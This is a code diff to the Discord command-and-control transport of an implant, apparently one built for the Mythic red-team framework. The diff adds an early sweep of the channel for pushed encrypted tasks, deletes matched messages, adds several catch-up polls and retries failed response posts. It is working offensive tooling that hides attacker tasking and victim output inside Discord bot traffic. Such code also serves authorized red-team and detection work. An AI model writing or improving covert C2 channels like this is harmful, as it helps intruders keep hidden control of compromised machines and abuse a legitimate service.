@@ -28,8 +28,9 @@ import (
 const (
 	discordAPIBase    = "https://discord.com/api/v10"
 	maxMessageLength  = 1950 // Discord limit ~2000; server uses 1950 threshold
-	defaultPollChecks = 10   // Default number of polling attempts per message exchange
-	defaultPollDelay  = 10   // Default seconds between polling attempts
+	defaultPollChecks = 20   // Default number of polling attempts per message exchange
+	defaultPollDelay  = 5    // Default seconds between polling attempts
+	catchUpPolls      = 3    // Number of catch-up polls after first match (push C2 timing)
 	// Discord's API requires a bot-format User-Agent for Bot token auth. Browser-like
 	// UAs (e.g. "Mozilla/5.0") return 403/40333. This is hardcoded because Discord
 	// enforces the format — operator customization would break API access.
@@ -395,15 +396,63 @@ func (d *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []struct
 		return nil, nil, err
 	}
 
+	var tasks []structs.Task
+	var inboundSocks []structs.SocksMsg
+
+	// Pre-poll sweep: check for any pushed tasks already in the Discord channel
+	// before sending get_tasking. In push C2, Mythic may push tasks between
+	// GetTasking cycles that haven't been collected yet.
+	prePollMsgs, err := d.getMessages(cfg, 100)
+	if err == nil {
+		for _, msg := range prePollMsgs {
+			respWrapper, parseErr := d.parseDiscordMessage(msg, cfg)
+			if parseErr != nil {
+				continue
+			}
+			// Match pushed tasks using callback UUID (senderID match)
+			if !respWrapper.ToServer && (respWrapper.ClientID == activeUUID ||
+				respWrapper.SenderID == activeUUID ||
+				(d.PayloadUUID != "" && respWrapper.ClientID == d.PayloadUUID)) {
+				d.deleteMessage(msg.ID, cfg)
+				// Process the pushed task immediately
+				decData, decErr := d.unwrapResponse(respWrapper.Message, cfg.EncryptionKey)
+				if decErr != nil {
+					continue
+				}
+				var taskResp map[string]interface{}
+				if json.Unmarshal(decData, &taskResp) == nil {
+					if taskList, exists := taskResp["tasks"]; exists {
+						if taskArray, ok := taskList.([]interface{}); ok {
+							for _, taskData := range taskArray {
+								if taskMap, ok := taskData.(map[string]interface{}); ok {
+									task := structs.NewTask(
+										getString(taskMap, "id"),
+										getString(taskMap, "command"),
+										getString(taskMap, "parameters"),
+									)
+									tasks = append(tasks, task)
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
 	// Use sendAndPollAll to collect ALL matching messages. In push C2, the channel
 	// may contain both the get_tasking response (empty tasks) AND pushed task messages.
 	responseMessages, err := d.sendAndPollAll(mythicMessage, activeUUID, cfg)
 	if err != nil {
+		// If sendAndPollAll fails but we found pre-poll tasks, return those
+		if len(tasks) > 0 {
+			if d.Debug {
+				log.Printf("GetTasking: sendAndPollAll failed but %d pre-poll tasks found", len(tasks))
+			}
+			return tasks, nil, nil
+		}
 		return nil, nil, fmt.Errorf("get tasking via Discord failed: %w", err)
 	}
-
-	var tasks []structs.Task
-	var inboundSocks []structs.SocksMsg
 
 	// Process ALL returned messages — merge tasks from each
 	for i, responseMessage := range responseMessages {
@@ -546,7 +595,15 @@ func (d *DiscordProfile) PostResponse(response structs.Response, agent *structs.
 
 	responseData, err := d.sendAndPoll(mythicMessage, activeUUID, cfg)
 	if err != nil {
-		return nil, fmt.Errorf("post response via Discord failed: %w", err)
+		// Retry once after a short delay — Discord API may be temporarily slow
+		if d.Debug {
+			log.Printf("PostResponse: first attempt failed: %v, retrying...", err)
+		}
+		time.Sleep(time.Duration(d.PollInterval) * time.Second)
+		responseData, err = d.sendAndPoll(mythicMessage, activeUUID, cfg)
+		if err != nil {
+			return nil, fmt.Errorf("post response via Discord failed (after retry): %w", err)
+		}
 	}
 
 	decryptedData, err := d.unwrapResponse(responseData, cfg.EncryptionKey)
@@ -686,11 +743,16 @@ func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sen
 				log.Printf("poll matched %d messages (attempt %d, fetched=%d parsed=%d skipped=%d)",
 					len(matched), attempt+1, totalFetched, totalParsed, totalSkipped)
 			}
-			// Catch-up re-poll: in push C2, more tasks may have arrived while we
-			// were processing. Do one additional poll to collect any stragglers.
-			time.Sleep(time.Duration(d.PollInterval) * time.Second)
-			extraMsgs, err := d.getMessages(cfg, 100)
-			if err == nil {
+			// Catch-up re-polls: in push C2, tasks arrive as separate gRPC messages
+			// and the Discord bot writes them asynchronously. Multiple catch-up polls
+			// give time for tasks pushed during this exchange to appear in the channel.
+			for catchUp := 0; catchUp < catchUpPolls; catchUp++ {
+				time.Sleep(time.Duration(d.PollInterval) * time.Second)
+				extraMsgs, err := d.getMessages(cfg, 100)
+				if err != nil {
+					continue
+				}
+				foundMore := false
 				for _, msg := range extraMsgs {
 					respWrapper, err := d.parseDiscordMessage(msg, cfg)
 					if err != nil {
@@ -699,7 +761,12 @@ func (d *DiscordProfile) sendAndPollAll(mythicMessage, senderID string, cfg *sen
 					if d.matchesAgent(respWrapper, clientID, senderID) {
 						d.deleteMessage(msg.ID, cfg)
 						matched = append(matched, respWrapper.Message)
+						foundMore = true
 					}
+				}
+				// If no new matches found, stop catch-up early
+				if !foundMore {
+					break
 				}
 			}
 			return matched, nil
